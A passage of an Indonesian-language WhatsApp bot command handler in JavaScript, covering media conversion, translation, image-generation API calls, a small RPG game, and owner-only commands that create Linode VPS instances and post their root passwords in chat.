let media = await Line.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
let buffer = fs.readFileSync(ran)
Line.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran) })
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'toaudio':
case 'tomp3': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/kutip vidio/vn dengan caption ${command}`)
  await vreact()
  let media = await quoted.download()
  let {
    toAudio
  } = require('./lib/general/exif')
  let audio = await toAudio(media, 'mp4')
  Line.sendMessage(m.chat, {
    audio,
    mimetype: 'audio/mpeg'
  }, {
    quoted: m
  })
}
break

case 'tovn': {
  try {
    if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/kutip vidio/audio dengan caption ${command}`)
    await vreact()
    var media = await m.quoted.download()
    let {
      toAudio
    } = require('./lib/general/exif')
    let audio = await toAudio(media, 'mp4')
    Line.sendMessage(from, {
      audio,
      mimetype: 'audio/mpeg',
      ptt: true
    }, {
      quoted: m
    })
  } catch (err) {
    m.reply('Terjadi kesalahan')
  }
}
break

case 'translate':
case 'tr': {
  try {
    if (!text) {
      return m.reply(
        `Kirim atau kutip pesan yang mau di-translate\nContoh: ${p_c}tr en apa kabar?\n\nen = kode bahasa\nInfo lebih: .listbahasa`
      );
    }
    const targetLang = args[0];
    if (!targetLang) {
      return m.reply('Tentukan kode bahasanya, contoh: en, id, jp, dll.');
    }
    const teks = m.quoted 
      ? m.quoted.text 
      : text.split(' ').slice(1).join(' ');
    if (!teks) {
      return m.reply('Teks yang mau di-translate tidak ditemukan');
    }
    const lines = teks.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    const translations = await Promise.all(
      lines.map(async (line) => {
        const encodedText = Enc(line);
        const apiUrl = `https://api.siputzx.my.id/api/tools/translate?text=${encodedText}&source=auto&target=${targetLang}`;
        const response = await fetchJson(apiUrl);
        return response && response.translatedText ? response.translatedText.trim() : '[Gagal diterjemahkan]';
      })
    );
    const translatedText = translations.join('\n');
    m.reply(translatedText);
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan: ' + err);
  }
}
break

case 'langlist':
case 'listbahasa': {
    const tk = `List bahasa yang tersedia:

    af  •>  Afrikaans
    sq  •>  Albanian
    am  •>  Amharic
    ar  •>  Arabic
    hy  •>  Armenian
    az  •>  Azerbaijani
    eu  •>  Basque
    be  •>  Belarusian
    bn  •>  Bengali
    bs  •>  Bosnian
    bg  •>  Bulgarian
    ca  •>  Catalan
    ceb  •>  Cebuano
    ny  •>  Chichewa
    zh-CN  •>  Chinese (Simplified)
    zh-TW  •>  Chinese (Traditional)
    co  •>  Corsican
    hr  •>  Croatian
    cs  •>  Czech
    da  •>  Danish
    nl  •>  Dutch
    en  •>  English
    eo  •>  Esperanto
    et  •>  Estonian
    tl  •>  Filipino
    fi  •>  Finnish
    fr  •>  French
    fy  •>  Frisian
    gl  •>  Galician
    ka  •>  Georgian
    de  •>  German
    el  •>  Greek
    gu  •>  Gujarati
    ht  •>  Haitian Creole
    ha  •>  Hausa
    haw  •>  Hawaiian
    he  •>  Hebrew
    iw  •>  Hebrew
    hi  •>  Hindi
    hmn  •>  Hmong
    hu  •>  Hungarian
    is  •>  Icelandic
    ig  •>  Igbo
    id  •>  Indonesian
    ga  •>  Irish
    it  •>  Italian
    ja  •>  Japanese
    jw  •>  Javanese
    kn  •>  Kannada
    kk  •>  Kazakh
    km  •>  Khmer
    ko  •>  Korean
    la  •>  Latin
    ms  •>  Malay
    my  •>  Myanmar (Burmese)
    ne  •>  Nepali
    no  •>  Norwegian
    pt  •>  Portuguese
    ro  •>  Romanian
    ru  •>  Russian
    sr  •>  Serbian
    sk  •>  Slovak
    so  •>  Somali
    es  •>  Spanish
    su  •>  Sundanese
    sw  •>  Swahili
    sv  •>  Swedish
    th  •>  Thai
    tr  •>  Turkish
    uk  •>  Ukrainian
    uz  •>  Uzbek
    vi  •>  Vietnamese`
    vreply(tk)
}
break
            
case 'toanime':
case 'toreal': {
try {
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
const api = {
xterm: {
url: "https://ai.xterm.codes",
key: "Fourstore"
}}
await vreact()
let type = "anime2d"
if (["jadinyata", "toreal"].includes(command)) {
type = "anime2real"
}
let tryng = 0
const media = await Line.downloadAndSaveMediaMessage(quoted)
let tph = await uploadToCdn(media)
let ai = await fetch(api.xterm.url + "/api/img2img/filters?action=" + type + "&url=" + tph + "&key=" + api.xterm.key).then(a => a.json())
console.log(ai)
if (!ai.status) return reply(ai?.msg || "Error!")
while (tryng < 55) {
let s = await fetch(api.xterm.url + "/api/img2img/filters/batchProgress?id=" + ai.id).then(a => a.json())
if (s.status == 3) {
return Line.sendMessage(m.chat, { image: { url: s.url } }, {quoted: m })
}
if (s.status == 4) {
return m.reply('Maaf terjadi kesalhan. coba gunakan gambar lain.')
}
await new Promise(resolve => setTimeout(resolve, 5000))
}} catch (err) {
console.error(err)
m.reply('Terjadi kesalahan')
}}
break

case 'text2img': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Hello World`);
const response = await axios.get(`https://dummyimage.com/600x400/000/fff&text=${encodeURIComponent(text)}`);
Line.sendMessage(m.chat, { image: { url: response.config.url }, caption: `🖼️ Gambar dari teks: ${text}` }, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'txt2imgv1': {
  if (!text) return m.reply(`Contoh: ${command} beautiful girl with handsome man`)
    vreact()
    await Line.sendMessage(m.chat, {image: {url: `https://api.tioo.eu.org/v1/text2img?text=${encodeURIComponent(text)}` }, caption: wm }, {quoted: m})
}
break

case 'txt2imgv2': {
  if (!text) return m.reply(`Contoh: ${command} beautiful girl with handsome man`)
    vreact()
    await Line.sendMessage(m.chat, {image: {url: `https://api.tioo.eu.org/v2/text2img?text=${encodeURIComponent(text)}` }, caption: wm }, {quoted: m})
}
break

case 'txt2imgv3': {
  if (!text) return m.reply(`Contoh: ${p_c} beautiful girl with handsome man`)
  vreact()
  await Line.sendMessage(m.chat, {image: {url: `https://api.ryzendesu.vip/api/ai/v2/text2img?prompt=${text}&model=sd3_5_large` }, caption: wm }, {quoted: m})
}
break

case 'txt2imgv4': {
  if (!text) return m.reply(`Contoh: ${p_c} beautiful girl with handsome man`)
    vreact()
    await Line.sendMessage(m.chat, {image: {url: `https://api.ryzendesu.vip/api/ai/v2/text2img?prompt=${text}&model=dalle` }, caption: wm }, {quoted: m})
}
break

case 'txt2imgv5': {
  if (!text) return m.reply(`Contoh: ${p_c} beautiful girl with handsome man`)
    vreact()
    let io = await fetchJson(`https://itzpire.com/ai/animediff2?prompt=${text}`)
    await Line.sendMessage(m.chat, {image: {url: io.result }, caption: wm }, {quoted: m})
}
break

case 'txt2imgv6': {
  if (!text) return m.reply(`Contoh: ${p_c} beautiful girl with handsome man`)
    vreact()
    let io = await fetchJson(`https://itzpire.com/ai/3dmodel?prompt=${text}&negative_prompt=Nothing`)
    await Line.sendMessage(m.chat, {image: {url: io.result }, caption: wm }, {quoted: m})
}
break

case 'blurimg':
case 'facepalm':
case 'beautiful': {
  if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${p_c}`);
  vreact();
  let media = await Line.downloadAndSaveMediaMessage(quoted)
  let url = await CatBox(media)
  Line.sendMessage(m.chat, {
    image: {url: `https://vapis.my.id/api/${command}?url=${url}` }}, {
    quoted: m
  });
}
break

case 'txtimg':
case 'textimg':
case 'txtimage':
case 'textimage': {
  if (!text) return m.reply(`Contoh: ${p_c} hai`)
  if (text.length > 150) return m.reply(`Karakter terbatas, max 150!`)
  vreact()
  Line.sendMessage(m.chat, {image: {url: `https://vapis.my.id/api/txtimage?q=${text}` }}, {quoted: m})
}
break

case 'emojimix': {
  if (!text.includes('+')) return m.reply(`Contoh: ${p_c} 😂+😭`)
  let [emoji1, emoji2] = text.split('+')
  if (!emoji1 || !emoji2) return m.reply(`Contoh: ${p_c} 😂+😭`)
  try {
    let res = await fetch(`https://api.tioo.eu.org/emojimix?emoji1=${emoji1}&emoji2=${emoji2}`)
    let buffer = await res.buffer()
    await Line.sendImageAsSticker(m.chat, buffer, m, {
      packname: ``,
      author: `${author} | ${db.data.users[m.sender].nama}`
    })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'attp':
case 'ttp': {
  if (!text) return m.reply(`Contoh: ${p_c} hai`)
  try {
    let res = await fetch(`https://api.tioo.eu.org/${command}?text=${text}`)
    if (!res.ok) throw new Error('Gagal mendapatkan respon')
    let buffer = await res.buffer()
    await Line.sendImageAsSticker(m.chat, buffer, m, {
      packname: ``,
      author: `${author} | ${db.data.users[m.sender].nama}`
    })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'dalle': {
  if (!text) return m.reply(`Contoh: ${command} beautiful girl with handsome man`)
    vreact()
    await Line.sendMessage(m.chat, {image: {url: `https://api.tioo.eu.org/dalle?text=${encodeURIComponent(text)}` }, caption: wm }, {quoted: m})
}
break

case 'ytkomen': {
if (!text) return m.reply(`Contoh: ${prefix+command} Toyaa`) 
vreact()
try {
let avatar
try {
avatar = await Line.profilePictureUrl(m.sender, 'image')
} catch {
avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg' }
let buffer = await getBuffer(`https://some-random-api.com/canvas/misc/youtube-comment?comment=${encodeURIComponent(text)}&avatar=${encodeURIComponent(avatar)}&username=${pushname}`)
await Line.sendMessage(m.chat, { image: buffer, caption: global.wm }, { quoted: m})
} catch (err) {
m.reply('Terjadi Kesalahan: '+err.toString())
}}
break

case 'carbon': {
vreact()
if (m.quoted) { tulisan = m.quoted.text
} else { tulisan = text }
if (!tulisan) return m.reply(`Contoh: ${prefix+command} Toyaa`) 
try {
let buffer = await CarbonifyV1(tulisan)
await Line.sendMessage(m.chat, { image: buffer, caption: global.wm }, { quoted: m})
} catch (error) {
try {
let buffer = await CarbonifyV2(tulisan)
await Line.sendMessage(m.chat, { image: buffer, caption: global.wm }, { quoted: m})
} catch (err) {
m.reply('Terjadi kesalahan: '+err.toString())
}}}
break

case 'hitung': {
if (!text) return m.reply(`Contoh: ${command} teksnya`)
const paragraf = text.split('\n\n').filter(par => par.trim() !== '');
const jumlahParagraf = paragraf.length;
const paragrafPertama = paragraf[0] || 'Tidak ada paragraf';
const paragrafTerakhir = paragraf[jumlahParagraf - 1] || 'Tidak ada paragraf';
const jumlahLine = text.split('\n').filter(line => line.trim() !== '').length;
const jumlahSpasi = (text.match(/ /g) || []).length;
const jumlahHurufBesar = (text.match(/[A-Z]/g) || []).length;
const jumlahHurufKecil = (text.match(/[a-z]/g) || []).length;
const jumlahAngka = (text.match(/[0-9]/g) || []).length;
const jumlahSymbol = (text.match(/[!@#$%^&*(),.?:{}|<>]/g) || []).length
let tekz = `*INFO/JUMLAH TEKS*\nTeks: ${toRupiah(text.length)}\nLine: ${toRupiah(jumlahLine)}\nParagraf: ${toRupiah(jumlahParagraf)}\nSpasi: ${toRupiah(jumlahSpasi)}\nHuruf besar: ${toRupiah(jumlahHurufBesar)}\nHuruf kecil: ${toRupiah(jumlahHurufKecil)}\n\n*ANGKA & SYMBOL*\nAngka: ${toRupiah(jumlahAngka)}\nSymbol: ${toRupiah(jumlahSymbol)}\n\n*PARAGRAF P&T*\n*Paragraf pertama:* ${paragrafPertama}\n\n*Paragraf terakhir:* ${paragrafTerakhir}\n\nHanya fitur gabut :v`;
m.reply(tekz)
}
break

//Rpg Menu

case 'joinrpg': {
  joinRPG(m.sender, m)
}
break

case 'leaverpg': {
  const initialLength = data.players.length
  data.players = data.players.filter(player => player.sender !== m.sender)
  console.log('Data setelah filter:', data.players)
  if (data.players.length === initialLength) {
    return m.reply('Kamu belum join RPG sebelumnya!')
  }
  try {
    fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
    console.log('File berhasil diperbarui:', './data/userRpg.json')
  } catch (err) {
    console.error('Error saat menyimpan file:', err)
    return m.reply('Gagal menyimpan perubahan. Coba lagi nanti.')
  }
  m.reply('Berhasil keluar dari RPG!')
}
break

case 'mulai': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')

  if (player.status === 'mulai') return m.reply('Kamu sudah memulai petualangan!')

  player.status = 'mulai'
  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
  m.reply('Petualangan dimulai! Sekarang kamu siap berpetualang.')
}
break

case 'adventure': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')
  
  const adventureCooldown = 60000 // 1 menit cooldown
  const now = Date.now()
  if (now - player.lastAdventure < adventureCooldown) {
    const remainingTime = Math.ceil((adventureCooldown - (now - player.lastAdventure)) / 1000)
    return m.reply(`Kamu butuh istirahat sebentar! Coba lagi dalam ${remainingTime} detik.`)
  }

  if (player.hp < 50) return m.reply('Darah kamu terlalu sedikit! Istirahat dulu sebelum lanjut petualangan.')

  if (player.status !== 'mulai') return m.reply('Kamu harus memulai petualangan dulu sebelum berpetualang!')

  player.status = 'adventure'
  player.lastAdventure = now
  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))

  const delayTime = randomNomor(500, 800)
  const adventureText = [
    'Kamu sedang mencari petualangan...',
    'Menemukan sebuah jalan tersembunyi...',
    'Menghadapi tantangan yang gak terduga...',
    'Berhasil menemukan sesuatu!'
  ]

  await ditt2(m.chat, m, delayTime, ...adventureText)

  if (randomChance()) {
    const { item, amount } = randomItem()
    updateResources(player, item, amount)
    m.reply(`Petualangan selesai! Kamu berhasil berburu dan mendapatkan ${amount} ${item}.`)
  } else if (randomChance()) {
    const damage = randomNomor(10, 30)
    player.hp = Math.max(0, player.hp - damage)
    fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
    m.reply(`Petualangan berhasil, tapi kamu diserang oleh makhluk liar dan HP berkurang ${damage}.`)
  } else {
    m.reply('Petualanganmu gagal! Tidak ada yang ditemukan.')
  }

  player.status = 'mulai'
  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
}
break

case 'inventory': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')

  let inventoryText = `*Inventory*\n`
  inventoryText += `HP: ${player.hp}\n`
  inventoryText += `Energi: ${player.energi}\n`
  inventoryText += `Kelaparan: ${player.kelaparan}\n`
  inventoryText += `Kehausan: ${player.kehausan}\n\n`
  inventoryText += `*Resources:*\n`

  for (const [resource, amount] of Object.entries(player.resources)) {
    if (resource === 'uang') {
      inventoryText += `- ${resource.charAt(0).toUpperCase() + resource.slice(1)}: ${toRupiah(amount)}\n`
    } else {
      inventoryText += `- ${resource.charAt(0).toUpperCase() + resource.slice(1)}: ${amount}\n`
    }
  }

  m.reply(inventoryText)
}
break

case 'makan': 
case 'minum': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')
  if (player.status !== 'mulai') return m.reply('Kamu harus memulai petualangan dulu sebelum berpetualang!')

  let itemType = (command === 'makan') ? 'food' : 'drink'
  let items = []
  if (itemType === 'food') {
    if (player.resources.roti > 0) items.push('Roti')
    if (player.resources.domba > 0) items.push('Domba')
    if (player.resources.sapi > 0) items.push('Sapi')
  } else if (itemType === 'drink') {
    if (player.resources.air > 0) items.push('Air')
  }

  if (items.length === 0) {
    return m.reply(`Kamu tidak punya ${itemType === 'food' ? 'makanan' : 'minuman'} di inventory!`)
  }

  if (items.length === 1) {
    const item = items[0]
    if (itemType === 'food') {
      player.kelaparan = Math.max(0, player.kelaparan - 3)
    } else if (itemType === 'drink') {
      player.kehausan = Math.max(0, player.kehausan - 3)
    }
    player.resources[item.toLowerCase()] -= 1
    m.reply(`Kamu telah ${itemType === 'food' ? 'makan' : 'minum'} ${item}.`)
  } else {
    const list = items.map(item => `- ${item}`).join('\n')
    m.reply(`Pilih ${itemType === 'food' ? 'makanan' : 'minuman'} yang ingin kamu ${itemType === 'food' ? 'makan' : 'minum'}:\n${list}`)
  }

  player.status = 'mulai'
  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
}
break

case 'craft': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')
  if (player.status !== 'mulai') return m.reply('Kamu harus memulai petualangan dulu sebelum craft!')

  const crafts = {
    'Roti': { kayu: 5, roti: 3, item: 'Roti' },
    'Domba Cooked': { domba: 2, roti: 1, item: 'Domba Cooked' },
    'Sapi Cooked': { sapi: 2, roti: 1, item: 'Sapi Cooked' },
    'Batu Bata': { kayu: 3, batu: 5, item: 'Batu Bata' },
    'Blok Kayu': { kayu: 10, item: 'Blok Kayu' }
  }

  const craftList = Object.keys(crafts)
  let craftText = 'Kamu bisa craft item berikut:\n'
  craftList.forEach((item, index) => {
    const requirements = crafts[item]
    let reqText = ''
    for (const resource in requirements) {
      if (resource !== 'item') {
        reqText += `${resource.charAt(0).toUpperCase() + resource.slice(1)}: ${requirements[resource]} `
      }
    }
    craftText += `${index + 1}. ${item} (${reqText})\n`
  })

  craftText += 'Pilih item yang ingin kamu craft dengan ketik nama item atau nomor item (misal: .craft Roti atau .craft 1)'

  if (!text) {
    return m.reply(craftText)
  }

  const choice = text.split(' ')[1]
  let itemName = ''
  if (choice && !isNaN(choice)) {
    itemName = craftList[parseInt(choice) - 1] || ''
  } else {
    itemName = craftList.find(item => item.toLowerCase() === choice.toLowerCase()) || ''
  }

  if (!itemName) return m.reply('Item tidak ditemukan! Ketik .craft untuk melihat daftar item yang bisa dicraft.')

  const requiredResources = crafts[itemName]
  let canCraft = true
  for (const resource in requiredResources) {
    if (resource !== 'item' && player.resources[resource] < requiredResources[resource]) {
      canCraft = false
      break
    }
  }

  if (canCraft) {
    for (const resource in requiredResources) {
      if (resource !== 'item') player.resources[resource] -= requiredResources[resource]
    }
    // Tambahkan item ke inventory pemain
    if (!player.resources[requiredResources.item.toLowerCase()]) {
      player.resources[requiredResources.item.toLowerCase()] = 1
    } else {
      player.resources[requiredResources.item.toLowerCase()] += 1
    }
    m.reply(`Kamu berhasil craft ${itemName}!`)
  } else {
    m.reply('Kamu tidak punya bahan yang cukup untuk craft item ini.')
  }

  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
}
break

case 'jual': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')

  const args = text.split(' ')
  const itemName = args[0]?.toLowerCase()
  const itemAmount = args[1] ? parseInt(args[1]) : 0

  if (!itemName) {
    let itemsList = "Kamu bisa jual barang berikut:\n"
    const availableItems = Object.keys(player.resources)
      .filter(key => key !== 'uang' && player.resources[key] > 0)
      .map(key => `${key.charAt(0).toUpperCase() + key.slice(1)}: ${player.resources[key]}`)

    if (availableItems.length === 0) return m.reply("Kamu tidak punya barang yang bisa dijual!")
    itemsList += availableItems.join('\n')
    itemsList += "\n\nContoh penggunaan: .jual [nama_barang] [jumlah]"
    return m.reply(itemsList)
  }

  if (!itemAmount || isNaN(itemAmount) || itemAmount <= 0)
    return m.reply('Masukkan jumlah yang valid untuk dijual!')

  if (!player.resources[itemName] || player.resources[itemName] < itemAmount)
    return m.reply(`Kamu tidak punya cukup ${itemName.charAt(0).toUpperCase() + itemName.slice(1)}!`)

  if (itemName === 'uang') return m.reply('Uang tidak bisa dijual!')

  const itemPrice = Math.floor(1000 + Math.random() * 4000)
  const totalPrice = itemPrice * itemAmount

  player.resources[itemName] -= itemAmount
  player.resources.uang += totalPrice

  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))

  m.reply(`Kamu berhasil menjual ${itemAmount} ${itemName.charAt(0).toUpperCase() + itemName.slice(1)} dan mendapatkan Rp. ${toRupiah(totalPrice)} uang!\n(Harga per unit: ${itemPrice})`)
}
break

case 'beli': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')

  const args = text.split(' ')
  const itemName = args[0]?.toLowerCase()
  const itemAmount = args[1] ? parseInt(args[1]) : 0

  const shopItems = {
    roti: 2000,
    air: 1000,
    kayu: 3000,
    domba: 5000,
    sapi: 8000,
    iron: 6000
  }

  if (!itemName) {
    let shopList = "*Barang yang tersedia untuk dibeli:*\n"
    for (const [item, price] of Object.entries(shopItems)) {
      shopList += `- ${item.charAt(0).toUpperCase() + item.slice(1)}: Rp. ${toRupiah(price)}\n`
    }
    shopList += "\nContoh penggunaan: .beli [nama_barang] [jumlah]"
    return m.reply(shopList)
  }

  if (!shopItems[itemName])
    return m.reply(`Barang ${itemName} tidak tersedia untuk dibeli!`)

  if (!itemAmount || isNaN(itemAmount) || itemAmount <= 0)
    return m.reply('Masukkan jumlah yang valid untuk dibeli!')

  const itemPrice = shopItems[itemName]
  const totalPrice = itemPrice * itemAmount

  if (player.resources.uang < totalPrice)
    return m.reply(`Uang kamu tidak cukup! Kamu membutuhkan Rp. ${toRupiah(totalPrice)} untuk membeli ${itemAmount} ${itemName.charAt(0).toUpperCase() + itemName.slice(1)}.`)

  player.resources.uang -= totalPrice
  player.resources[itemName] = (player.resources[itemName] || 0) + itemAmount

  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))

  m.reply(`Kamu berhasil membeli ${itemAmount} ${itemName.charAt(0).toUpperCase() + itemName.slice(1)} seharga Rp. ${toRupiah(totalPrice)}!\n(Harga per unit: ${toRupiah(itemPrice)})`)
}
break

case 'mining': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')

  if (player.energi < 10) 
    return m.reply('Energi kamu tidak cukup untuk melakukan mining! (Minimal 10 energi)')

  const rewards = {
    batu: { chance: 40, min: 5, max: 15 },
    iron: { chance: 30, min: 3, max: 10 },
    emas: { chance: 20, min: 1, max: 5 },
    berlian: { chance: 10, min: 1, max: 2 }
  }

  const totalChance = Object.values(rewards).reduce((sum, item) => sum + item.chance, 0)
  const randomChance = Math.random() * totalChance

  let accumulatedChance = 0
  let minedItem = null
  for (const [item, data] of Object.entries(rewards)) {
    accumulatedChance += data.chance
    if (randomChance <= accumulatedChance) {
      const amount = Math.floor(Math.random() * (data.max - data.min + 1)) + data.min
      player.resources[item] = (player.resources[item] || 0) + amount
      minedItem = { item, amount }
      break
    }
  }

  m.reply('⛏️ Mulai mining...').then(async () => {
    await ditt2(m.sender, m, 1000, '⛏️ Menggali...', '⛏️ Mendalami lapisan batu...', '⛏️ Mencari harta karun...')
    
    player.energi -= 10
    fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))

    if (minedItem) {
      const itemName = minedItem.item.charAt(0).toUpperCase() + minedItem.item.slice(1)
      m.reply(`⛏️ Kamu berhasil mendapatkan ${minedItem.amount} ${itemName} saat mining!`)
    } else {
      m.reply('⛏️ Kamu tidak mendapatkan apa-apa kali ini. Cobalah lagi!')
    }
  })
}
break

case 'mancing': {
  const player = data.players.find(player => player.sender === m.sender)
  if (!player) return m.reply('Kamu harus join RPG terlebih dahulu!')

  if (!player.resources.umpan || player.resources.umpan < 1) 
    return m.reply('Kamu butuh umpan untuk memancing!')

  const rewards = {
    ikanMas: { chance: 25, min: 1, max: 3 },
    ikanLele: { chance: 20, min: 1, max: 2 },
    ikanBawal: { chance: 15, min: 1, max: 2 },
    ikanNila: { chance: 10, min: 1, max: 4 },
    ikanPatin: { chance: 10, min: 1, max: 2 },
    ikanTenggiri: { chance: 8, min: 1, max: 1 },
    ikanKakap: { chance: 8, min: 1, max: 2 },
    ikanBaramundi: { chance: 7, min: 1, max: 1 },
    ikanLeleAfrika: { chance: 5, min: 1, max: 1 },
    ikanMasKoki: { chance: 5, min: 1, max: 1 },
    sampah: { chance: 30, min: 1, max: 3 },
    mutiara: { chance: 15, min: 1, max: 1 },
    harta: { chance: 5, min: 1, max: 1 }
  }

  const totalChance = Object.values(rewards).reduce((sum, item) => sum + item.chance, 0)
  const randomChance = Math.random() * totalChance

  let accumulatedChance = 0
  let caughtItem = null
  for (const [item, data] of Object.entries(rewards)) {
    accumulatedChance += data.chance
    if (randomChance <= accumulatedChance) {
      const amount = Math.floor(Math.random() * (data.max - data.min + 1)) + data.min
      player.resources[item] = (player.resources[item] || 0) + amount
      caughtItem = { item, amount }
      break
    }
  }

  player.resources.umpan = Math.max(0, player.resources.umpan - 1)
  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))

  m.reply('🎣 Mulai memancing...').then(async () => {
    await ditt2(m.sender, m, 1000, '🎣 Menyiapkan alat...', '🎣 Menunggu ikan...', '🎣 Menarik tali pancing...')
    
    if (caughtItem) {
      const itemName = caughtItem.item.charAt(0).toUpperCase() + caughtItem.item.slice(1)
      m.reply(`🎣 Kamu berhasil mendapatkan ${caughtItem.amount} ${itemName} saat memancing!`)
    } else {
      m.reply('🎣 Kamu tidak mendapatkan apa-apa kali ini. Cobalah lagi!')
    }
  })
}
break

// === Linode Menu

case 'linode2gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-1',
      image: 'linode/ubuntu20.04',
      root_pass: randomKarakter(5)+randomNomor(3),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;
      m.reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${linodeToken}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0];

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Line.sendMessage(m.chat, { text: messageText }, {quoted: m});
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break

case 'linode4gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-2',
      image: 'linode/ubuntu20.04',
      root_pass: randomKarakter(5)+randomNomor(3),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;
      m.reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${linodeToken}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0];

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Line.sendMessage(m.chat, { text: messageText }, {quoted: m});
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break

case 'linode8gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-4',
      image: 'linode/ubuntu20.04',
      root_pass: randomKarakter(5)+randomNomor(3),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;
      m.reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${linodeToken}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0];

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Line.sendMessage(m.chat, { text: messageText }, {quoted: m});
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break

case 'linode16gb': {
  if (!isOwner) return onlyOwn();
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
